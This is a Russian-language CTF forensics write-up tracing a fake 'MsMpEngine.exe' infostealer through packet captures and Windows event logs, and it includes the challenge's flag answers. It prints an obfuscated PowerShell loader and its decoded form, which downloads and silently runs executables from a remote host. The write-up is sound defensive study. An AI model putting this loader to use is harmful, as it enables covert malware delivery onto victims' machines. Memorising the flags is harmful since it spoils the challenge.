### –í –∑–∞–¥–∞–Ω–∏–∏ –ø–æ–ª—É—á–∞–µ–º –∞—Ä—Ö–∏–≤ —Å–æ —Å–ª–µ–¥—É—é—â–∏–º —Å–æ–¥–µ—Ä–∂–∏–º—ã–º:

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# ls -la
total 117480
drwxrwxrwx 1 root root         0 Jul 22 07:18 .
drwxrwxrwx 1 root root         0 Jul 28 07:07 ..
drwxrwxrwx 1 root root     81920 Jun 25 00:45 Logs
-rwxrwxrwx 1 root root 120216748 Jun 24 23:48 task.pcapng
```

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# file task.pcapng 
task.pcapng: pcapng capture file - version 1.0
```

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# ls -la Logs               
total 41952
drwxrwxrwx 1 root root   81920 Jun 25 00:45  .
drwxrwxrwx 1 root root       0 Jul 22 07:18  ..
-rwxrwxrwx 1 root root 1118208 Jun 24 23:46  Application.evtx
-rwxrwxrwx 1 root root   69632 Jun 24 11:31  HardwareEvents.evtx
-rwxrwxrwx 1 root root   69632 Jun 24 11:31 'Internet Explorer.evtx'
-rwxrwxrwx 1 root root   69632 Jun 24 11:31 'Key Management Service.evtx'
-rwxrwxrwx 1 root root 1052672 Jun 24 23:20  Microsoft-Client-Licensing-Platform%4Admin.evtx                                                              
-rwxrwxrwx 1 root root   69632 Jun 24 18:57  Microsoft-Windows-AAD%4Operational.evtx                                                                      
-rwxrwxrwx 1 root root   69632 Jun 24 23:46  Microsoft-Windows-Application-Experience%4Program-Compatibility-Assistant.evtx
...
```

### –ü–æ–ª—É—á–∞–µ–º —Ç—Ä–∞—Ñ–∏–∫ –∏ evtx –∂—É—Ä–Ω–∞–ª—ã –≤ –ø–∞–ø–∫–µ Logs:

EVTX ‚Äî —ç—Ç–æ —Ñ–æ—Ä–º–∞—Ç –∂—É—Ä–Ω–∞–ª–∞ —Å–æ–±—ã—Ç–∏–π –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö Windows. –û–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –∏ —Ö—Ä–∞–Ω–µ–Ω–∏—è –∂—É—Ä–Ω–∞–ª–æ–≤ —Å–æ–±—ã—Ç–∏–π –¥–ª—è –æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏—è —Å–∏—Å—Ç–µ–º—ã –∏ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –Ω–µ–ø–æ–ª–∞–¥–æ–∫.

–ö–∞–∂–¥—ã–π —Ñ–∞–π–ª EVTX —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –∑–∞–ø–∏—Å–µ–π. –ó–∞–ø–∏—Å–∏ –æ–±—ã—á–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, –∫–∞—Å–∞—é—â—É—é—Å—è –æ—à–∏–±–æ–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –∏ —Å–∏—Å—Ç–µ–º—ã, –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–π, –¥–µ–π—Å—Ç–≤–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —Å–æ–±—ã—Ç–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ —Å–µ—Ç–µ–≤–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏.

–î–∞–Ω–Ω—ã–µ –∂—É—Ä–Ω–∞–ª–∞ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∫ –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏ —Å–∏—Å—Ç–µ–º—ã, —Ç–∞–∫ –∏ –¥–ª—è –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è —Å–æ–±–ª—é–¥–µ–Ω–∏—è –ø—Ä–∞–≤–∏–ª –∞—É–¥–∏—Ç–∞.

## Q1) –ö–æ–≥–¥–∞ –Ω–∞—á–∞–ª—Å—è –∏–Ω—Ü–∏–¥–µ–Ω—Ç (–¥–¥:–º–º:–≥–≥–≥–≥_—á—á:–º–º:—Å—Å)?

–ü–µ—Ä–≤—ã–º –¥–µ–ª–æ–º —Å–º–æ—Ç—Ä–∏–º –Ω–µ –ø–æ–ø–∞–ª–∏ –ª–∏ –∫ –Ω–∞–º –∫–∞–∫–∏–µ —Ç–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ —Ñ–∞–π–ª—ã –ø–æ —Å–µ—Ç–∏:

### –û—Ç–∫—Ä—ã–≤–∞–µ–º task.pcapng –≤ wireshark, –≤—ã—Å—Ç–∞–≤–ª—è–µ–º —Ñ–∏–ª—å—Ç—Ä

```
http
```

### –ù–∞—Ö–æ–¥–∏–º —Å–ª–µ–¥—É—é—â–∏–π –∑–∞–ø—Ä–æ—Å –Ω–∞ –∑–∞–≥—Ä—É–∑–∫—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ MsMpEngine.exe:

![](./screens/screen1.PNG)

–î–∞–Ω–Ω—ã–π —Ñ–∞–π–ª –ø–æ—Ö–æ–∂ –Ω–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Ç–∞–∫ –∫–∞–∫ –∑–∞–º–µ—Ç–µ–Ω –∑–∞–∫–æ—Å –ø–æ–¥ MsMpEng.exe

MsMpEng.exe ‚Äî –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ–æ–Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ –≤ Windows 10 –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞ ¬´–ó–∞—â–∏—Ç–Ω–∏–∫ Windows¬ª. 
–û–Ω –ø–æ—Å—Ç–æ—è–Ω–Ω–æ –∑–∞–ø—É—â–µ–Ω –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤, –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –∏ –ø—Ä–æ–≥—Ä–∞–º–º –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —É–≥—Ä–æ–∑.

### –ß–µ—Ä–µ–∑ –§–∞–π–ª -> –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –æ–±—ä–µ–∫—Ç—ã -> http –≤ Wireshark —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —ç—Ç–æ—Ç —Ñ–∞–π–ª

![](./screens/screen2.PNG)

### –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–∞–π–ª:

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# file MsMpEngine.exe 
MsMpEngine.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
                                                                             
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# sha256sum MsMpEngine.exe       
fb4e22809cf28be7e7efa38718ce386044775d6ffafbfd391b43ec0f3afd4439  MsMpEngine.exe
```

### –•—ç—à –∑–∞–∫–∏–¥—ã–≤–∞–µ–º –Ω–∞ Virustotal:

https://www.virustotal.com/gui/file/fb4e22809cf28be7e7efa38718ce386044775d6ffafbfd391b43ec0f3afd4439

–í–µ—Ä–¥–∏–∫—Ç - —ç—Ç–æ –≤—Ä–µ–¥–æ–Ω–æ—Å!

![](./screens/screen3.PNG)

–¢–µ–ø–µ—Ä—å –±–µ—Ä–µ–º –≤—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ –∑–∞ –≤—Ä–µ–º—è –Ω–∞—á–∞–ª–∞ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞

![](./screens/screen4.PNG)

## –û—Ç–≤–µ—Ç: caplag{25:06:2025_06:40:49}

## Q2) –ö–∞–∫ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Ñ–∞–π–ª? (filename.ext)

## –û—Ç–≤–µ—Ç: caplag{MsMpEngine.exe}

## Q3) SHA1 —Ö–µ—à —Å—É–º–º–∞ –º–∞–ª–≤–∞—Ä–∏?

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# sha1sum MsMpEngine.exe  
8ccc992780eade907e5270b3f6a87041fb3ccbfc  MsMpEngine.exe
```

## –û—Ç–≤–µ—Ç: caplag{8ccc992780eade907e5270b3f6a87041fb3ccbfc}

## Q4) –≤ –∫–∞–∫–æ–π –ø–∞–ø–∫–µ —Ö—Ä–∞–Ω–∏–ªc—è –º–∞–ª–≤–∞—Ä—å (–ø–æ–ª–Ω—ã–π –ø—É—Ç—å)?

### –£—Å—Ç–∞–Ω–æ–≤–∏–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –≠—Ä–∏–∫–∞ –¶–∏–º–º–µ—Ä–º–∞–Ω–∞ EvtxECmd –∏ —Ä–∞—Å–ø–∞—Ä—Å–∏–º evtx –∂—É—Ä–Ω–∞–ª—ã:

–Ø —Ä–µ—à–∏–ª —Å—Ä–∞–∑—É —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å –≤—Å–µ –∂—É—Ä–Ω–∞–ª—ã, —Ç–∞–∫ —Å–∫–∞–∑–∞—Ç—å –Ω–∞ –±—É–¥—É—â–µ–µ:

```
PS C:\Users\scrock_\Desktop\softs\EvtxECmd\EvtxeCmd> Get-ChildItem "C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\Logs\*.evtx" | ForEach-Object {
>>     $outputName = $_.BaseName + ".json"
>>     .\EvtxECmd.exe -f $_.FullName --json "C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\evtx_results"
>>     $tempFile = Get-ChildItem "C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\evtx_results\*.json" -File | Sort-Object LastWriteTime | Select-Object -Last 1
>>     Rename-Item -Path $tempFile.FullName -NewName $outputName
>> }
```

### –î–ª—è –Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∂—É—Ä–Ω–∞–ª Microsoft-Windows-PowerShell%4Operational.evtx (–ø–æ–ø—Ä–æ–±—É–µ–º –ø–æ–Ω—è—Ç—å –∫–∞–∫ –≤–æ–æ–±—â–µ –º–∞–ª–≤–∞—Ä—å —Å—é–¥–∞ –ø–æ–ø–∞–ª–∞):

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task/evtx_results]
‚îî‚îÄ# cat Microsoft-Windows-PowerShell%4Operational.json 
```

–¢—É—Ç –º—ã –Ω–∞—Ö–æ–¥–∏–º —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É:

```
{"PayloadData1":"Path: ","PayloadData2":"ScriptBlockText: 
$compressed = 'H4sIAAAAAAAA/5TOzU6DQBAH8FcZNz1AIgv0oC3Ek6WRpB9YanrphbJTO2a7S5ZRJMZ3N3jQxPTiZQ7z8fvPSJGDOxAjNG/JU5ltis16ni+yvTxT7WxrjyxSoCN4V94WWw6Kik8wXPk+fMAKuyBnPMN33fYNwowc1mxdD7+78JnC6NXpIenE3CRhGE/HMr6ZyPg2lvF4mkyiKBIpeIO4PrxgzbBCljs83GtCw76c2c5oW6k5afTEwIXLdtlk5pkMSnxHcQ1iSNv/afv/ZcvHBTHK3DA620il9Q99YeSnUHLlOCicrbFtLz8BwY6Msl3JvUZ4IKXQfAUAAP//NycKn30BAAA='; 
$bytes = [System.Convert]::FromBase64String($compressed); $stream = New-Object IO.MemoryStream(, $bytes); $decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); 
$reader = New-Object IO.StreamReader($decompressed); $obfuscated = $reader.ReadToEnd(); Invoke-Expression $obfuscated","MapDescription":"Contains contents of scripts run","ChunkNumber":0,"Computer":"DESKTOP-JDMCC6F"
```

–≠—Ç–æ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π PowerShell —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π:

1. **–î–µ–∫–æ–¥–∏—Ä—É–µ—Ç Base64**  
   –ò–∑–≤–ª–µ–∫–∞–µ—Ç –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å—Ç—Ä–æ–∫–∏ –≤ —Ñ–æ—Ä–º–∞—Ç–µ Base64.

2. **–†–∞—Å–ø–∞–∫–æ–≤—ã–≤–∞–µ—Ç Gzip**  
   –î–µ–∞—Ä—Ö–∏–≤–∏—Ä—É–µ—Ç —Å–∂–∞—Ç—ã–µ –¥–∞–Ω–Ω—ã–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞–ª–≥–æ—Ä–∏—Ç–º–∞ Gzip.

3. **–í—ã–ø–æ–ª–Ω—è–µ—Ç —Ä–∞—Å–ø–∞–∫–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥ —á–µ—Ä–µ–∑ Invoke-Expression**  
   –ò—Å–ø–æ–ª–Ω—è–µ—Ç –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∏ —Ä–∞—Å–ø–∞–∫–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã PowerShell —Å –ø–æ–º–æ—â—å—é `Invoke-Expression`.

### –ü–æ–ª—É—á–∞–µ–º –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥:

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task/evtx_results]
‚îî‚îÄ# echo "H4sIAAAAAAAA/5TOzU6DQBAH8FcZNz1AIgv0oC3Ek6WRpB9YanrphbJTO2a7S5ZRJMZ3N3jQxPTiZQ7z8fvPSJGDOxAjNG/JU5ltis16ni+yvTxT7WxrjyxSoCN4V94WWw6Kik8wXPk+fMAKuyBnPMN33fYNwowc1mxdD7+78JnC6NXpIenE3CRhGE/HMr6ZyPg2lvF4mkyiKBIpeIO4PrxgzbBCljs83GtCw76c2c5oW6k5afTEwIXLdtlk5pkMSnxHcQ1iSNv/afv/ZcvHBTHK3DA620il9Q99YeSnUHLlOCicrbFtLz8BwY6Msl3JvUZ4IKXQfAUAAP//NycKn30BAAA=" | base64 -d | gzip -d
$dir = "$env:USERPROFILE\.microsoft"; if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }; $url = "http://192.168.171.129:8000"; 
(New-Object Net.WebClient).DownloadFile("$url/MsMpEngine.exe", "$dir\MsMpEngine.exe"); 
(New-Object Net.WebClient).DownloadFile("$url/SQLite.Interop.dll", "$dir\SQLite.Interop.dll"); 
Start-Process "$dir\MsMpEngine.exe" -WindowStyle Hidden
```

–î–∞–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ –¥–µ–π—Å—Ç–≤–∏—è:

1. **–°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏**  
   –°–æ–∑–¥–∞–µ—Ç —Å–∫—Ä—ã—Ç—É—é –ø–∞–ø–∫—É –≤ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (`$env:USERPROFILE`)

2. **–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ —Å —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞**  
   –ó–∞–≥—Ä—É–∂–∞–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã:
   - `MsMpEngine.exe` (–º–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–¥ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç Windows Defender)
   - `SQLite.Interop.dll` (–±–∏–±–ª–∏–æ—Ç–µ–∫–∞ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å SQLite)

3. **–ó–∞–ø—É—Å–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞**  
   –í—ã–ø–æ–ª–Ω—è–µ—Ç –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–π `MsMpEngine.exe` —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏

4. **–î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ Base64**  
   –ò–∑–≤–ª–µ–∫–∞–µ—Ç –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å—Ç—Ä–æ–∫–∏ –≤ —Ñ–æ—Ä–º–∞—Ç–µ Base64

5. **–†–∞—Å–ø–∞–∫–æ–≤–∫–∞ Gzip**  
   –î–µ–∞—Ä—Ö–∏–≤–∏—Ä—É–µ—Ç —Å–∂–∞—Ç—ã–µ –¥–∞–Ω–Ω—ã–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞–ª–≥–æ—Ä–∏—Ç–º–∞ Gzip

6. **–ò—Å–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ Invoke-Expression**  
   –ó–∞–ø—É—Å–∫–∞–µ—Ç –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∏ —Ä–∞—Å–ø–∞–∫–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã PowerShell

–¢–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ —É–∑–Ω–∞—Ç—å –∫—Ç–æ –∑–∞–ø—É—Å—Ç–∏–ª —ç—Ç—É –∫–æ–º–∞–Ω–¥—É, –ø–æ–ª—É—á–∏—Ç—å SID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –º—ã –º–æ–∂–µ–º —Ç–∞–∫–∂–µ –≤ Microsoft-Windows-PowerShell%4Operational.json

```
{"ChunkNumber":0,"Computer":"DESKTOP-JDMCC6F","Payload":"{\"EventData\":\"\"}","UserId":"S-1-5-21-4066093945-3834177589-3221255045-1001","Channel":"Microsoft-Windows-PowerShell/Operational","Provider"
:"Microsoft-Windows-PowerShell","EventId":40962,"EventRecordId":"6","ProcessId":4712,"ThreadId":8384,"Level":"Info","Keywords":"0x0",
"SourceFile":"C:\\Users\\scrock_\\Desktop\\a\\iso\\ctf\\EHAX++\\chall1\\task\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx",
"ExtraDataOffset":0,"HiddenRecord":false,"TimeCreated":"2025-06-25T03:40:24.1211486+00:00","RecordNumber":6}
```

### –î–∞–ª–µ–µ –ø–æ SID –∏—â–µ–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task/evtx_results]
‚îî‚îÄ# cat Security.json | grep -i "S-1-5-21-4066093945-3834177589-3221255045-1001"
```

### –†–µ–∑—É–ª—å—Ç–∞—Ç:

```
{"PayloadData1":"Target: DESKTOP-JDMCC6F\\PC31 (S-1-5-21-4066093945-3834177589-3221255045-1001)","PayloadData2":"SubjectLogonId: 0x2BC6A","PayloadData3":
"CallerProcessName: C:\\Windows\\explorer.exe","PayloadData4":"CallerProcessI
```

–í—ã–≤–æ–¥: –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å PC31

## –û—Ç–≤–µ—Ç: caplag{C:\Users\PC31\.microsoft}

## Q5) –£–∫–∞–∂–∏—Ç–µ –∞–π–ø–∏ –∞–¥—Ä–µ—Å –∏ –ø–æ—Ä—Ç, –æ—Ç–∫—É–¥–∞ –ø—Ä–∏—à–µ–ª –º–∞–ª–≤–∞—Ä—å (ip:port)

–í—Å–µ –∏–∑ —Ç–æ–≥–æ –∂–µ —Ñ—Ä–µ–π–º–∞ –ø–æ–ª—É—á–∞–µ–º –∏—Å—Ç–æ—á–Ω–∏–∫ –º–∞–ª–≤–∞—Ä–∏

![](./screens/screen5.PNG)

## –û—Ç–≤–µ—Ç: caplag{https://192.168.171.129:8000}

## Q6) –£–∫–∞–∂–∏—Ç–µ –∞–π–ø–∏ –∞–¥—Ä–µ—Å –∏ –¥–æ–º–µ–Ω–Ω–æ–µ –∏–º—è C2 –∑–ª–æ–≤—Ä–µ–¥–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞, –∫—É–¥–∞ –ø–æ—Å—Ç—É–ø–∞–ª–∏ –∑–∞–ø—Ä–æ—Å—ã (ip:domain).

### –õ–∏—Å—Ç–∞–ª —Ç—Ä–∞—Ñ–∏–∫ –∏ –Ω–∞—à–µ–ª –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ dns –∑–∞–ø—Ä–æ—Å—ã, –ø–æ—Ö–æ–∂–∏–µ –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É –¥–∞–Ω–Ω—ã—Ö C2-—Å–µ—Ä–≤–µ—Ä—É

![](./screens/screen6.PNG)

![](./screens/screen7.PNG)

## –û—Ç–≤–µ—Ç: caplag{192.168.0.105:windows-defender.live-control}

## Q7) –†–µ–≤–µ—Ä—Å–Ω–∏—Ç–µ –º–∞–ª–≤–∞—Ä—å, –∫–∞–∫–æ–π –ø–∞—Ä–æ–ª—å –¥–ª—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö?

### –¢—É—Ç –ø—Ä–æ–∏–∑–æ—à–µ–ª —Å–∏–ª—å–Ω—ã–π —Å—Ç–æ–ø, –ø–æ—Ç–æ–º—É —á—Ç–æ –∫ —Ç–∞–∫–æ–º—É —è –Ω–µ –±—ã–ª –≥–æ—Ç–æ–≤, —á–∞—Å–æ–≤ 6 –≥–ª—É–ø—ã—Ö –ø–æ–ø—ã—Ç–æ–∫, –Ω–æ —è —Ä–∞—Å—Å–∫–∞–∂—É –∫–∞–∫ –ø–æ –∏—Ç–æ–≥—É –ø–æ–ª—É—á–∏–ª–æ—Å—å —Ä–µ—à–∏—Ç—å:

–ï—â–µ —Ä–∞–∑:

```
‚îå‚îÄ‚îÄ(root„âøscrock)-[~/mnt/chall1/task]
‚îî‚îÄ# file MsMpEngine.exe 
MsMpEngine.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

–ò–∑ –≤—ã–≤–æ–¥–∞ –∫–æ–º–∞–Ω–¥—ã file –≤–∏–¥–Ω–æ, —á—Ç–æ MsMpEngine.exe ‚Äî —ç—Ç–æ .NET-—Å–±–æ—Ä–∫–∞ (—É–∫–∞–∑–∞–Ω–æ Mono/.Net assembly).

–û—Ç–∫—Ä–æ–µ–º —Ñ–∞–π–ª –≤ dnSpy, –µ—Å–ª–∏ –æ–Ω .NET, —Ç–æ –º—ã —É–≤–∏–¥–∏–º –¥–µ–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥:

![](./screens/screen9.PNG)

### –ü—Ä–æ–π–¥–µ–º—Å—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä–æ–º:

![](./screens/screen8.PNG)

### –ü—Ä–æ—Ü–µ—Å—Å –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ —Å –ø–æ–º–æ—â—å—é .NET Reactor Slayer:

1. **–ó–∞–ø—É—Å–∫ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞**  
   ‚ñ∂Ô∏è –ó–∞–ø—É—Å—Ç–∏–ª `.NET Reactor Slayer`

2. **–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞**  
   üìå –ü–µ—Ä–µ—Ç–∞—â–∏–ª `MsMpEngine.exe` –≤ —Ä–∞–±–æ—á—É—é –æ–±–ª–∞—Å—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—ã

3. **–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤**  
   ‚öôÔ∏è –û—Å—Ç–∞–≤–∏–ª –æ–ø—Ü–∏–∏ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é:  

4. **–ó–∞–ø—É—Å–∫ –æ–±—Ä–∞–±–æ—Ç–∫–∏**  
   üöÄ –ù–∞—á–∞–ª –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—é

5. **–†–µ–∑—É–ª—å—Ç–∞—Ç**  
   ‚úÖ –ü–æ–ª—É—á–∏–ª –æ—á–∏—â–µ–Ω–Ω—ã–π —Ñ–∞–π–ª `MsMpEngine_cleaned.exe`  
   üîç –ü—Ä–æ–≤–µ—Ä–∏–ª —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ dnSpy –Ω–∞ —á–∏—Ç–∞–µ–º–æ—Å—Ç—å –∫–æ–¥–∞

![](./screens/screen10.PNG)

### –û—Ç–∫—Ä—ã–≤–∞–µ–º Class2.Main (—Ç–æ—á–∫–∞ –≤—Ö–æ–¥–∞):

![](./screens/screen11.PNG)

### –¢—É—Ç –º—ã —É–∂–µ –º–æ–∂–µ–º –Ω–∞–π—Ç–∏ —á—Ç–æ-—Ç–æ –ø–æ—Ö–æ–∂–µ–µ –Ω–∞ –ø–∞—Ä–æ–ª—å, –ø—Ä–æ–π–¥–µ–º—Å—è —Å—Ç–æ–∫–æ–≤—ã–º de4dot, –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∏–º–µ–Ω

```
C:\Program Files\de4dot>de4dot C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\MsMpEngine_Slayed.exe -o C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\MsMpEngine_Slayed_Cleaned.exe

de4dot v3.1.41592.3405 Copyright (C) 2011-2014 de4dot@gmail.com
Latest version and source code: https://github.com/0xd4d/de4dot

Detected Unknown Obfuscator (C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\MsMpEngine_Slayed.exe)
Cleaning C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\MsMpEngine_Slayed.exe
Renaming all obfuscated symbols
Saving C:\Users\scrock_\Desktop\a\iso\ctf\EHAX++\chall1\task\MsMpEngine_Slayed_Cleaned.exe
```

### üî• –î–µ–π—Å—Ç–≤–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã

### üìå –≠—Ç–∞–ø —Å–±–æ—Ä–∞ –∏ –ø–µ—Ä–µ–¥–∞—á–∏ –¥–∞–Ω–Ω—ã—Ö
1. **–ì–µ–Ω–µ—Ä–∞—Ü–∏—è —É–Ω–∏–∫–∞–ª—å–Ω–æ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞**  
   - –°–æ–±–∏—Ä–∞–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é:
     - üñ•Ô∏è –ò–º—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞ (`MachineName`)  
     - üë§ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (`UserName`)  
     - üé´ –°–ª—É—á–∞–π–Ω—ã–π `GUID`  
   - –§–æ—Ä–º–∏—Ä—É–µ—Ç —Å—Ç—Ä–æ–∫—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ:  
     ```plaintext
     {MachineName}_{UserName}_{GUID}.txt
     ```

2. **–û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö**  
   - üî¢ –†–∞–∑–±–∏–≤–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –Ω–∞ –±–ª–æ–∫–∏  
